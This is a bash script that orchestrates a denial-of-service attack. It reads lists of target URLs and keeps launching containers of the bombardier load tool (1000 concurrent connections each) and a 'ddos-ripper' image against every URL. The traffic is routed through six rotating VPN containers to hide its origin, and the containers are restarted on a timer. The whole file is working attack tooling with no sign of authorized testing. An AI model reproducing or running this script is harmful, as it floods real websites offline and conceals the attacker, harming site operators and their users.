#!/bin/bash
RESOURCES_FILE_BOMB=$1
INSTANCE_PER_BOMB=$2
RESOURCES_FILE_RIPPER=$3
INSTANCE_PER_RIPPER=$4
TTL=$5


LOOP_COUNT=1
STEPS=$(expr $TTL / 30)
NUM_VPN=6
CUR=1
echo "$STEPS"


kill_docker_except_vpn () {
  sudo docker rm -f $(sudo docker ps -aq --filter ancestor=alpine/bombardier) >/dev/null 2>&1 || true
  for i in {0..4} ; do
    echo -n '['
    for ((j=0; j<i; j++)) ; do echo -n '#'; done
    echo -n ''
    for ((j=i; j<5; j++)) ; do echo -n ' '; done
    echo -n "] $i / 5s" $'\r'
    sleep 1
  done
}
start_docker_containers () {
  IFS=$'\n' read -d '' -r -a lines < $1
  for URL in "${lines[@]}"
  do
    NAME_BASE=$(sed 's+https://++g' <<<"$URL")
    NAME_BASE=$(sed 's+http://++g' <<<"$NAME_BASE")
    NAME_BASE=$(sed 's+/++g' <<<"$NAME_BASE")
    NAME_BASE=$(sed 's+\.+_+g' <<<"$NAME_BASE")

    for (( c=1; c<=$2; c++ ))
    do
      {
        if [ $CUR -gt $NUM_VPN ]
        then
          CUR=1
        fi
        TAR_VPN="app"$CUR"_vpn_1"
        echo "Starting for $URL. using VPN: $TAR_VPN"

        NAME="VPN""$CUR""_""$NAME_BASE""$c"
        sudo docker run --name $NAME -d -m $3 --cpu-quota=90000 --rm --net=container:$TAR_VPN $4 $URL
        CUR=$(expr $CUR + 1)
      } &> /dev/null
    done
  done
}
wait_for_loop () {
  for i in {1..29} ; do
    echo -n '['
    for ((j=0; j<i; j++)) ; do echo -n '#'; done
    echo -n ''
    for ((j=i; j<30; j++)) ; do echo -n ' '; done
    echo -n "] $(expr $STEPS \* $i) / $TTL s" $'\r'
    sleep $STEPS
  done
}


echo "Bombardier file: $RESOURCES_FILE_BOMB with $INSTANCE_PER_BOMB instances per url"
echo "Ripper file: $RESOURCES_FILE_RIPPER with $INSTANCE_PER_RIPPER instances per url"
echo "Restarting instances every $TTL seconds"


while true
do
   echo "Starting loop $LOOP_COUNT..."


   echo "Killing all running docker instances..."
   kill_docker_except_vpn
   echo "Killed all instances."


   echo "Starting Bombardier instances..."
   start_docker_containers $RESOURCES_FILE_BOMB $INSTANCE_PER_BOMB 128m "alpine/bombardier -c 1000 -d 540 -l"
   echo "Bombardier instances started."
 
 
   echo "Starting Ripper instances..."
   start_docker_containers $RESOURCES_FILE_RIPPER $INSTANCE_PER_RIPPER 256m "nitupkcuf/ddos-ripper"
   echo "Ripper instances started."


   echo "Waiting for $TTL seconds."
   wait_for_loop
   echo "Loop ended."
done
